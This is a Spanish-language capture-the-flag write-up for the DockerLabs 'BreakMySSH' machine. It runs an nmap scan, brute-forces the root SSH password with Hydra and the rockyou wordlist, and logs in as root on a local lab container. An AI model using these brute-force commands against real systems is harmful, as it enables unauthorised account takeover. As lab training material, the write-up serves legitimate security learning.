---
title: BreakMySSH - DockerLabs
categories: [ Linux ]
tags: [DockerLabs]
---

<img src="/assets/img/DLabs/breakmyssh/breakmyssh.png" alt="Captura de pantalla de la máquina BreakMySSH en DockerLabs">

Hoy explotaremos la máquina *BreakMySSH* de [DockerLabs](https://dockerlabs.es/), de dificultad Muy Fácil. Vamos a realizar un ataque de fuerza bruta con **Hydra** para obtener la contraseña del usuario **root.**

## Desplegamos la máquina

```bash
➤ sudo bash auto_deploy.sh tproot.tar
[sudo] contraseña para nmc:

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```



## Escaneo NMAP

Antes que nada, deberemos hacer un escaneo de puertos con **nmap** para encontrar los puertos abiertos y qué servicios corren en ellos.

```bash
➤ nmap -sV -p- --min-rate=100 -T4 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 13:14 CST
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.51 seconds
```



EEl servicio SSH está activo. Como no encontramos más opciones, realizamos un ataque de fuerza bruta con **Hydra** al usuario **root** de la máquina víctima, usando el diccionario **rockyou.**

## Hydra

Realizamos un ataque de fuerza bruta contra el usuario **root.**

```bash
➤ hydra -l root  -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```



## SSH 

Intentamos la conexión mediante **SSH** con las credenciales obtenidas durante el ataque:

```bash
➤ ssh root@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@e250faedf493:~# whoami
root
root@e250faedf493:~# 
```



## Acceso ROOT obtenido

¡Máquina comprometida! Te deseo un feliz hackeo.
